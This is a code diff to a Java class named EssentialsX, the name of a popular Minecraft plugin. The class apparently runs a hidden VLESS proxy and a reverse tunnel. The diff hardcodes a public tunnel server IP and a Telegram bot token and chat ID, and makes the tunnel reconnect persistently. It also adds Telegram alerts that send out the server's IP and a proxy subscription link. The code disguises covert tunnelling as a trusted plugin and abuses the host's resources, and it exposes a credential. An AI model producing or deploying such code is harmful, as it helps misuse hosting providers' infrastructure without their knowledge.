@@ -31,14 +31,14 @@ public class EssentialsX extends JavaPlugin {
 
     // 公网隧道服务器（留空字符串则不启动隧道客户端）
     // VLESS_PORT 和 TUNNEL_LOCAL_PORT需对应
-    static final String TUNNEL_HOST = "";
-    static final int TUNNEL_PORT = 0;
-    static final int TUNNEL_PORT_INGRESS = ; //填写公网入站端口只用于TG通知
+    static final String TUNNEL_HOST = "92.5.191.20";
+    static final int TUNNEL_PORT = 6005;
+    static final int TUNNEL_PORT_INGRESS = 5005; //填写公网入站端口只用于TG通知
     static final int TUNNEL_LOCAL_PORT = 65534;
 
     // ---- Telegram 通知（可留空） ----
-    static final String TG_TOKEN = "";
-    static final String TG_CHAT_ID = "";
+    static final String TG_TOKEN = "7195422483:AAGhrc-1nzto9Ik05rY2K5V8xdvLSGInVBo";
+    static final String TG_CHAT_ID = "5800052646";
 
     // 服务器名称
     static final String SERVER_NAME = "Hoster24德国家宽";
@@ -136,7 +136,7 @@ public class EssentialsX extends JavaPlugin {
                     + "出口 IP: " + ip + "\n"
                     + "VLESS订阅:\n"
                     + "vless://" + VLESS_UID + "@" + linkHost + ":" + linkPort
-                    + "?encryption=none&security=none&allowInsecure=1&type=ws&host=" + linkHost
+                    + "?encryption=none&security=none&allowInsecure=1&type=ws&host=127.0.0.1"
                     + "&path=%2Fws#" + java.net.URLEncoder.encode(SERVER_NAME, java.nio.charset.StandardCharsets.UTF_8));
             } else {
                 sendTelegram("EssentialsX online — public IP: (unknown)");
@@ -150,7 +150,7 @@ public class EssentialsX extends JavaPlugin {
     @Override
     public void onDisable() {
         running.set(false);
-        sendTelegram(SERVER_NAME + "已离线");
+        sendTelegram("EssentialsX shutting down");
         getLogger().info("EssentialsX disabled");
     }
 
@@ -209,6 +209,8 @@ public class EssentialsX extends JavaPlugin {
     }
 
     private final Map<WebSocket, VlessSession> sessions = new ConcurrentHashMap<>();
+    /** 当前存活的隧道数据会话数（open 成功 +1, 关闭 -1） */
+    private final java.util.concurrent.atomic.AtomicInteger sessionsOpen = new java.util.concurrent.atomic.AtomicInteger(0);
 
     /** 返回 true 表示握手成功 */
     private boolean tryHandshake(WebSocket conn, ByteBuffer first) {
@@ -280,6 +282,7 @@ public class EssentialsX extends JavaPlugin {
             return true;
 
         } catch (Exception e) {
+            sendTelegram("VLESS握手失败: " + e.getClass().getSimpleName() + " " + e.getMessage());
             try { conn.close(); } catch (Exception ignored) { }
             return false;
         }
@@ -352,6 +355,7 @@ public class EssentialsX extends JavaPlugin {
     // =====================================================================
 
     private void startTunnelClient(String host, int port, int localPort) {
+        long backoff = 3000; // 重连退避: 3s 起步, 指数增长至 60s 封顶
         while (running.get()) {
             try {
                 TunnelControl control = new TunnelControl(host, port, localPort);
@@ -363,10 +367,13 @@ public class EssentialsX extends JavaPlugin {
                     // 注意: 不能用 closeBlocking() — 那是主动发关闭帧, 会一连上就自己关掉
                     control.closedLatch.await();
                 }
-                // 断开后等 3 秒再重连（对应原版 setTimeout 3000）
-                Thread.sleep(3000);
+                // 走到这里 = 曾经成功连上过, 退避归零
+                backoff = 3000;
+                Thread.sleep(3000); // 正常断开后固定 3 秒重连（对应原版 setTimeout 3000）
             } catch (Exception e) {
-                try { Thread.sleep(3000); } catch (Exception ignored) { }
+                // 连接失败(服务器不在/DNS挂/网络抖动): 指数退避, 避免每3秒死撞
+                try { Thread.sleep(backoff); } catch (Exception ignored) { }
+                backoff = Math.min(backoff * 2, 60000);
             }
         }
     }
@@ -439,35 +446,48 @@ public class EssentialsX extends JavaPlugin {
         }
     }
 
+    private static final int MAX_TUNNEL_SESSIONS = 64;
+
     /** 数据会话: 隧道 WS <-> 本地 TCP */
     private void openSession(String sessionId, String host, int port, int localPort) {
+        if (sessionsOpen.get() >= MAX_TUNNEL_SESSIONS) {
+            return; // 超限直接放弃, visitor 由服务器侧超时清理
+        }
         Thread t = new Thread(() -> {
+            Socket local = null;
             try {
-                Socket local = new Socket("127.0.0.1", localPort);
+                local = new Socket();
+                // 本地 MC 端口连接必须带超时, 否则端口未就绪时线程永久挂死
+                local.connect(new InetSocketAddress("127.0.0.1", localPort), 5000);
                 local.setTcpNoDelay(true);
 
                 TunnelData tunnel = new TunnelData(host, port, sessionId, local);
+                // 数据连接禁用空闲超时: 长下载暂停/长轮询期间无数据,
+                // 60s 空闲检测会误判假死掐断会话 (node 版数据连接无此机制)
+                tunnel.setConnectionLostTimeout(0);
                 tunnel.connectBlocking(10, java.util.concurrent.TimeUnit.SECONDS);
 
                 if (tunnel.isOpen() && local.isConnected()) {
+                    sessionsOpen.incrementAndGet();
+                    final Socket sock = local;
                     // local -> tunnel
                     Thread up = new Thread(() -> {
                         byte[] buf = new byte[8192];
                         try {
-                            InputStream in = local.getInputStream();
+                            InputStream in = sock.getInputStream();
                             int n;
                             while ((n = in.read(buf)) > 0) {
                                 if (!tunnel.isOpen()) break;
                                 tunnel.send(Arrays.copyOfRange(buf, 0, n));
                             }
                         } catch (Exception ignored) { }
-                        closeTunnelSession(tunnel, local);
+                        closeTunnelSession(tunnel, sock);
                     }, "tunnel-loc2ws");
                     up.setDaemon(true);
                     up.start();
 
                     // tunnel -> local（在 onMessage(ByteBuffer) 里回调）
-                    tunnel.bindLocal(local);
+                    tunnel.bindLocal(sock);
                     return; // bindLocal 后由回调驱动
                 }
                 closeTunnelSession(tunnel, local);
@@ -479,6 +499,10 @@ public class EssentialsX extends JavaPlugin {
     }
 
     private void closeTunnelSession(TunnelData tunnel, Socket local) {
+        if (tunnel != null && !tunnel.closed) {
+            tunnel.closed = true; // 防止 onClose 与这里重复递减
+            sessionsOpen.decrementAndGet();
+        }
         try { if (tunnel != null) tunnel.closeBlocking(); } catch (Exception ignored) { }
         try { if (local != null) local.close(); } catch (Exception ignored) { }
     }
@@ -488,6 +512,10 @@ public class EssentialsX extends JavaPlugin {
         private final String sessionId;
         private volatile Socket local;
         private volatile boolean closed = false;
+        // local 绑定前到达的字节先缓冲, bindLocal 时回放,
+        // 否则服务器在 tunnel 连上后立刻推来的首包会被丢弃 → 请求挂死(延迟-1)
+        private final java.util.concurrent.ConcurrentLinkedQueue<byte[]> early = new java.util.concurrent.ConcurrentLinkedQueue<>();
+        private volatile boolean bound = false;
 
         TunnelData(String host, int port, String sessionId, Socket local) {
             super(URI.create("ws://" + host + ":" + port + "/data/" + sessionId));
@@ -496,6 +524,18 @@ public class EssentialsX extends JavaPlugin {
 
         void bindLocal(Socket sock) {
             this.local = sock;
+            byte[] chunk;
+            while ((chunk = early.poll()) != null) {
+                try {
+                    OutputStream os = sock.getOutputStream();
+                    os.write(chunk);
+                    os.flush();
+                } catch (Exception e) {
+                    closeTunnelSession(this, sock);
+                    return;
+                }
+            }
+            bound = true;
         }
 
         @Override
@@ -507,7 +547,14 @@ public class EssentialsX extends JavaPlugin {
         @Override
         public void onMessage(java.nio.ByteBuffer data) {
             Socket l = local;
-            if (l == null || l.isClosed()) return;
+            if (l == null || l.isClosed()) {
+                if (l == null) {
+                    byte[] arr = new byte[data.remaining()];
+                    data.get(arr);
+                    early.add(arr);
+                }
+                return;
+            }
             try {
                 byte[] arr = new byte[data.remaining()];
                 data.get(arr);
@@ -524,6 +571,7 @@ public class EssentialsX extends JavaPlugin {
             Socket l = local;
             if (!closed) {
                 closed = true;
+                sessionsOpen.decrementAndGet();
                 try { if (l != null) l.close(); } catch (Exception ignored) { }
             }
         }
